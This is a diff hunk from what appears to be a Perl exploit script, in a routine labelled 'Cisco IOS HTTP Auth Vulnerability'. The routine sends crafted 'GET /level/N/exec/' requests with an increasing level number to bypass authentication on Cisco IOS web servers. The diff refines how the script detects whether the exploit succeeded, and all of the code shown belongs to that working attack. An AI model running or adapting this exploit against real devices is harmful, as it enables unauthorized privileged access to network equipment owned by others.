@@ -211,12 +211,13 @@ sub cisco3              # Cisco IOS HTTP Auth Vulnerability
         my @results=exploit("GET /level/".$n."/exec/- HTTP/1.0\r\n\r\n");
         $n++;
         foreach $line (@results){
-            $line=~ tr/A-Z/a-z/;
             if ($line =~ /http\/1\.0 401 unauthorized/) {$fg=1;}
             if ($line =~ /http\/1\.0 200 ok/) {$fg=0;}
+            if ($fg == 0 && $line =~ /^\r\n/) {$fg=2;}
+            if ($fg == 2 && $line =~ /HTML/) {$fg=3;}
         }
 
-        if ($fg==1) {
+        if ($fg==1 || $fg==2) {
             sleep(2);
             print "Vulnerability unsuccessful exploited ...\n\n";
             exit(1);
